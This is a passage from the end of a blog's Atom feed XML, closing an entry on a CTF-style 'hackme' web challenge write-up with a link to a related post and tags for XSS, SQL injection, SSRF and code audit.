href="https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#wordpress-1" target="_blank" rel="noopener">https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#wordpress-1</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      关于hackme web wp
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
      <category term="sql注入" scheme="https://museljh.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="ssrf" scheme="https://museljh.github.io/tags/ssrf/"/>
    
      <category term="代码审计" scheme="https://museljh.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
